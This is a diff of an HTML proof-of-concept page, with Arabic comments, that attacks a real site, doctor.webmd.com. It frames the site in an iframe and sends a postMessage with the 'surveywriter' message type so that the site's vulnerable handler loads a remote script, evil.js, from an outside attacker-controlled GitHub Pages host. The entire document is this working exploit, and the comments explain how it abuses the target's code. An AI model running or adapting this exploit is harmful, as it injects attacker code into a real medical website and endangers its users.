@@ -1,26 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC Prototype Pollution WebMD</title>
+    <title>WebMD Security Research - PoC</title>
 </head>
 <body>
-    <h1>Exploit Lab - Testing PostMessage Pollution</h1>
-    <iframe src="https://doctor.webmd.com/results?q=test" id="victim" style="width:500px; height:500px;"></iframe>
+    <h1>Exploit Demo: PostMessage to RCE/XSS</h1>
+    <p>Status: <span id="status">Loading Victim Site...</span></p>
+
+    <iframe id="victimFrame" 
+            src="https://doctor.webmd.com/results?q=test" 
+            style="width: 800px; height: 600px; border: 1px solid red;">
+    </iframe>
 
     <script>
-        const victimFrame = document.getElementById('victim');
+        const status = document.getElementById('status');
+        const frame = document.getElementById('victimFrame');
 
-      // انتظر قليلاً حتى يتم تحميل الـ iframe بالكامل
-setTimeout(() => {
-    const victimFrame = window.parent; // أو حدد الـ iframe إذا كنت تفتحه داخل صفحة
-    const payload = {
-        message: "surveywriter",
-        source: "https://egyhaker.github.io/webmd.com-attacker/evil.js" // رابط الملف الذي صنعناه
-    };
-    
-    console.log("🚀 Sending Payload to inject remote script...");
-    victimFrame.postMessage(payload, "*"); 
-}, 3000);
+        // ننتظر 5 ثوانٍ لضمان تحميل سكريبتات WebMD (chunk-vendors.js) بالكامل
+        setTimeout(() => {
+            status.innerText = "Sending Exploit Payload...";
+            
+            // بناء الرسالة التي يتوقعها الكود المصاب
+            const exploitMessage = {
+                message: "surveywriter",
+                source: "https://egyhaker.github.io/webmd.com-attacker/evil.js" // رابط ملفك
+            };
+
+            /**
+             * نرسل الرسالة إلى الـ iframe. 
+             * الكود المصاب في WebMD سيستقبلها لأن t.data.message هو "surveywriter"
+             * وسيقوم بإنشاء سكريبت جديد مصدره (src) هو ملف evil.js الخاص بك.
+             */
+            frame.contentWindow.postMessage(exploitMessage, "*");
+            
+            status.innerText = "Payload Sent! Check the iframe for an alert.";
+            status.style.color = "green";
+        }, 5000); 
     </script>
 </body>
 </html>
